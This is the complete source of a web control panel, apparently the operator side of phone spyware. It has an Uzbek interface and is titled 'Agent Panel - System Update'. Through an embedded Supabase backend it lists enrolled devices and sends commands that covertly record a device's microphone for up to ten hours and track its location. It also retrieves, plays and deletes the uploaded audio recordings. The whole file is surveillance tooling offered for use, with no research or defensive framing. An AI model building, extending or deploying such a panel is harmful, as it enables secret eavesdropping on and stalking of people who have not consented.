<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agent Panel - System Update</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <style>
        body { background-color: #0f172a; color: #e2e8f0; font-family: sans-serif; }
        .device-card:hover { background-color: #1e293b; cursor: pointer; border-color: #3b82f6; }
        .active-device { background-color: #1e293b; border-left: 4px solid #3b82f6; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0f172a; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #475569; }
    </style>
</head>
<body class="h-screen flex flex-col md:flex-row overflow-hidden">

    <div class="w-full md:w-1/4 bg-slate-900 border-r border-slate-700 flex flex-col h-1/3 md:h-full">
        <div class="p-4 border-b border-slate-700 flex justify-between items-center">
            <div>
                <h1 class="text-xl font-bold text-blue-400"><i class="fa-solid fa-user-secret"></i> Agent Panel</h1>
                <p class="text-xs text-slate-500 mt-1">Monitoring Tizimi</p>
            </div>
            <div id="connectionStatus" class="w-3 h-3 rounded-full bg-red-500" title="Supabase aloqasi"></div>
        </div>
        
        <div id="deviceList" class="flex-1 overflow-y-auto p-2 space-y-2">
            <p class="text-center text-slate-500 mt-10">Qurilmalar yuklanmoqda...</p>
        </div>
        
        <div class="p-4 border-t border-slate-700">
            <button onclick="fetchDevices()" class="w-full bg-slate-800 hover:bg-slate-700 text-white py-2 rounded text-sm transition">
                <i class="fa-solid fa-sync"></i> Ro'yxatni Yangilash
            </button>
        </div>
    </div>

    <div class="flex-1 flex flex-col h-2/3 md:h-full bg-slate-800 relative">
        
        <div id="emptyState" class="absolute inset-0 flex items-center justify-center flex-col text-slate-500">
            <i class="fa-solid fa-mobile-screen text-6xl mb-4 text-slate-600"></i>
            <p>Boshqarish uchun chap tomondan qurilmani tanlang</p>
        </div>

        <div id="mainContent" class="hidden flex-col h-full">
            
            <div class="p-4 bg-slate-900 border-b border-slate-700 flex justify-between items-center shadow-md">
                <div>
                    <h2 id="selectedModel" class="text-2xl font-bold text-white">Device Model</h2>
                    <p id="selectedId" class="text-xs text-slate-400 font-mono select-all">ID: ...</p>
                </div>
                <div class="flex items-center space-x-3">
                    <span id="deviceStatusBadge" class="px-3 py-1 rounded-full text-xs font-bold bg-slate-700 text-slate-300">Offline</span>
                    <button onclick="deleteCurrentDevice()" class="bg-red-900/50 hover:bg-red-600 text-red-200 hover:text-white px-3 py-1 rounded transition text-sm border border-red-900">
                        <i class="fa-solid fa-trash"></i>
                    </button>
                </div>
            </div>

            <div class="flex-1 overflow-y-auto p-4 md:p-6">
                
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
                    
                    <div class="bg-slate-700 p-5 rounded-xl shadow-lg border border-slate-600">
                        <h3 class="text-lg font-semibold mb-4 text-blue-300 flex items-center gap-2">
                            <i class="fa-solid fa-microphone"></i> Audio Yozish
                        </h3>
                        
                        <div class="flex items-center justify-between bg-slate-800 p-3 rounded-lg mb-4 border border-slate-600">
                            <button onclick="changeDuration(-1)" class="w-10 h-10 flex items-center justify-center bg-slate-700 hover:bg-slate-600 rounded-full transition text-xl font-bold">
                                <i class="fa-solid fa-minus"></i>
                            </button>
                            
                            <div class="text-center">
                                <span id="durationDisplay" class="text-xl font-bold text-white">1 daqiqa</span>
                                <p class="text-[10px] text-slate-500 uppercase tracking-wider">Davomiyligi</p>
                            </div>

                            <button onclick="changeDuration(1)" class="w-10 h-10 flex items-center justify-center bg-slate-700 hover:bg-slate-600 rounded-full transition text-xl font-bold">
                                <i class="fa-solid fa-plus"></i>
                            </button>
                        </div>

                        <div class="grid grid-cols-1 gap-3">
                            <button id="startAudioBtn" onclick="handleStartAudio()" class="bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg transition font-medium shadow-md flex items-center justify-center gap-2">
                                <i class="fa-solid fa-play"></i> Yozishni Boshlash
                            </button>
                            <button onclick="sendCommand('audio', 'stop')" class="bg-red-500 hover:bg-red-600 text-white py-3 rounded-lg transition font-medium shadow-md flex items-center justify-center gap-2">
                                <i class="fa-solid fa-stop"></i> To'xtatish
                            </button>
                        </div>
                        <p class="text-[10px] text-slate-400 mt-3 text-center italic">
                    </div>

                    <div class="bg-slate-700 p-5 rounded-xl shadow-lg border border-slate-600">
                        <h3 class="text-lg font-semibold mb-4 text-yellow-300 flex items-center gap-2">
                            <i class="fa-solid fa-location-dot"></i> Joylashuv
                        </h3>
                        <div class="grid grid-cols-1 gap-3">
                            <button onclick="sendCommand('location', 'start')" class="bg-yellow-600 hover:bg-yellow-700 text-white py-2 rounded-lg transition shadow-md">
                                <i class="fa-solid fa-satellite-dish mr-1"></i> Kuzatishni Boshlash (5 daqiqa)
                            </button>
                            <button onclick="sendCommand('location', 'stop')" class="bg-slate-600 hover:bg-slate-500 text-white py-2 rounded-lg transition shadow-md">
                                <i class="fa-solid fa-pause mr-1"></i> Kuzatishni To'xtatish
                            </button>
                             <button onclick="getLastLocation()" class="bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg mb-2 transition shadow-md">
                                <i class="fa-solid fa-map-location-dot mr-1"></i> Xaritada Ko'rish
                            </button>
                        </div>
                    </div>
                </div>

                <div class="bg-slate-700 rounded-xl shadow-lg border border-slate-600 overflow-hidden flex flex-col h-96">
                    <div class="p-4 bg-slate-900 border-b border-slate-600 flex justify-between items-center sticky top-0 z-10">
                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
                            <i class="fa-solid fa-folder-open"></i> Yuklangan Fayllar
                        </h3>
                        <button onclick="fetchFiles()" class="text-sm bg-slate-800 hover:bg-slate-600 px-3 py-1 rounded text-blue-400 transition">
                            <i class="fa-solid fa-rotate"></i>
                        </button>
                    </div>
                    <div class="flex-1 overflow-y-auto">
                        <ul id="fileList" class="divide-y divide-slate-600">
                            <li class="p-4 text-center text-slate-400 text-sm">Fayllarni ko'rish uchun "Yangilash" tugmasini bosing</li>
                        </ul>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        // --- SUPABASE SOZLAMALARI ---
        const SUPABASE_URL = 'https://acfcxecjnnpmdrjsioxw.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_tsXXwAy9z1y9hSuy9uG3wA_OnpUYT-Z'; 
        
        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        let currentDeviceId = null;

        // --- AUDIO VAQT SOZLAMALARI ---
        const timeOptions = [
            { label: '1 daqiqa', val: 1 },
            { label: '30 daqiqa', val: 30 },
            { label: '1 soat', val: 60 },
            { label: '3 soat', val: 180 },
            { label: '5 soat', val: 300 },
            { label: '8 soat', val: 480 },
            { label: '10 soat', val: 600 }
        ];
        let currentTimeIndex = 0;

        function changeDuration(direction) {
            currentTimeIndex += direction;
            if (currentTimeIndex < 0) currentTimeIndex = 0;
            if (currentTimeIndex >= timeOptions.length) currentTimeIndex = timeOptions.length - 1;
            
            document.getElementById('durationDisplay').innerText = timeOptions[currentTimeIndex].label;
        }

        function handleStartAudio() {
            const minutes = timeOptions[currentTimeIndex].val;
            // Buyruqni yuborish (sekundga o'girib yuboramiz: daqiqa * 60)
            sendCommand('audio', 'start', minutes * 60);
        }

        // --- ASOSIY FUNKSIYALAR ---
        window.onload = function() {
            checkConnection();
            fetchDevices();
            setInterval(fetchDevices, 30000); 
        };

        async function checkConnection() {
            const statusEl = document.getElementById('connectionStatus');
            const { data, error } = await supabaseClient.from('devices').select('count', { count: 'exact', head: true });
            if (!error) {
                statusEl.classList.remove('bg-red-500');
                statusEl.classList.add('bg-green-500');
            }
        }

        async function fetchDevices() {
            const listEl = document.getElementById('deviceList');
            const { data, error } = await supabaseClient.from('devices').select('*').order('last_seen', { ascending: false });

            if (error) return;

            listEl.innerHTML = '';
            if (!data || data.length === 0) {
                 listEl.innerHTML = '<p class="text-center text-xs text-slate-500 mt-4">Qurilmalar yo\'q</p>';
                 return;
            }

            data.forEach(device => {
                const div = document.createElement('div');
                const isActive = currentDeviceId === device.device_id;
                div.className = `device-card p-3 rounded transition border border-transparent mb-2 ${isActive ? 'active-device' : ''}`;
                div.onclick = () => selectDevice(device);
                
                const isOnline = device.status === 'online';
                const statusColor = isOnline ? 'text-green-400' : 'text-slate-500';

                div.innerHTML = `
                    <div class="flex justify-between items-center">
                        <span class="font-bold text-sm text-slate-200 truncate pr-2">${device.model || 'Noma\'lum'}</span>
                        <i class="fa-solid fa-circle text-[10px] ${statusColor}"></i>
                    </div>
                    <div class="text-[10px] text-slate-400 truncate mt-1 font-mono">${device.device_id}</div>
                `;
                listEl.appendChild(div);
            });
        }

        function selectDevice(device) {
            currentDeviceId = device.device_id;
            document.getElementById('emptyState').classList.add('hidden');
            document.getElementById('mainContent').classList.remove('hidden');
            document.getElementById('mainContent').classList.add('flex');
            document.getElementById('selectedModel').innerText = device.model || "Noma'lum";
            document.getElementById('selectedId').innerText = device.device_id;
            
            const badge = document.getElementById('deviceStatusBadge');
            badge.className = device.status === 'online' ? "px-3 py-1 rounded-full text-xs font-bold bg-green-900 text-green-300" : "px-3 py-1 rounded-full text-xs font-bold bg-slate-700 text-slate-300";
            badge.innerText = device.status === 'online' ? "Online" : "Offline";

            fetchFiles();
        }

        async function fetchFiles() {
            if (!currentDeviceId) return;
            const listEl = document.getElementById('fileList');
            listEl.innerHTML = '<li class="p-4 text-center text-slate-500 animate-pulse">Yuklanmoqda...</li>';
            
            const { data, error } = await supabaseClient.storage.from('monitoring').list(`audio/${currentDeviceId}`, {
                limit: 50, sortBy: { column: 'created_at', order: 'desc' },
            });

            if (error) { listEl.innerHTML = `<li class="p-4 text-red-500 text-center">Xato</li>`; return; }

            listEl.innerHTML = '';
            if (!data || data.length === 0) {
                listEl.innerHTML = '<li class="p-4 text-center text-slate-400">Audio fayllar yo\'q</li>'; return;
            }

            data.forEach(file => {
                if(file.name === '.emptyFolderPlaceholder') return;
                const { data: urlData } = supabaseClient.storage.from('monitoring').getPublicUrl(`audio/${currentDeviceId}/${file.name}`);
                const date = new Date(file.created_at).toLocaleString('uz-UZ');
                const li = document.createElement('li');
                li.className = "p-3 flex justify-between items-center hover:bg-slate-800 transition group";
                li.innerHTML = `
                    <div class="flex items-center space-x-3 overflow-hidden">
                        <div class="bg-blue-900/50 p-2 rounded text-blue-300"><i class="fa-solid fa-file-audio"></i></div>
                        <div class="min-w-0">
                            <div class="text-sm font-medium text-slate-200 truncate group-hover:text-white">${file.name}</div>
                            <div class="text-[10px] text-slate-500">${date}</div>
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        <a href="${urlData.publicUrl}" target="_blank" class="bg-slate-700 hover:bg-blue-600 px-3 py-1.5 rounded text-xs transition"><i class="fa-solid fa-download"></i></a>
                        <button onclick="deleteFile('${file.name}')" class="bg-slate-700 hover:bg-red-600 px-3 py-1.5 rounded text-xs transition"><i class="fa-solid fa-trash"></i></button>
                    </div>
                `;
                listEl.appendChild(li);
            });
        }

        async function deleteFile(fileName) {
            if(!confirm(`O'chirilsinmi?`)) return;
            const { error } = await supabaseClient.storage.from('monitoring').remove([`audio/${currentDeviceId}/${fileName}`]);
            if (!error) fetchFiles();
        }

        async function getLastLocation() {
            if (!currentDeviceId) return;
            const { data, error } = await supabaseClient.from('locations').select('*').eq('device_id', currentDeviceId).order('created_at', { ascending: false }).limit(1).single();
            if (error || !data) { alert("Lokatsiya topilmadi."); return; }
            window.open(`https://www.google.com/maps?q=${data.latitude},${data.longitude}`, '_blank');
        }
        
        async function deleteCurrentDevice() {
            if (!currentDeviceId || !confirm("Qurilmani ro'yxatdan o'chirasizmi?")) return;
            const { error } = await supabaseClient.from('devices').delete().eq('device_id', currentDeviceId);
            if (!error) location.reload();
        }

        async function sendCommand(feature, action, duration = null) {
            if (!currentDeviceId) return alert("Qurilma tanlanmagan!");
            const { error } = await supabaseClient.from('commands').insert({
                device_id: currentDeviceId, feature: feature, action: action, duration: duration, status: 'pending'
            });
            if (error) alert("Xato: " + error.message);
            else {
                const toast = document.createElement('div');
                toast.className = 'fixed bottom-5 right-5 bg-green-600 text-white px-4 py-2 rounded shadow-lg z-50';
                toast.innerText = 'Buyruq yuborildi!';
                document.body.appendChild(toast);
                setTimeout(() => toast.remove(), 2000);
            }
        }
    </script>
</body>
</html>
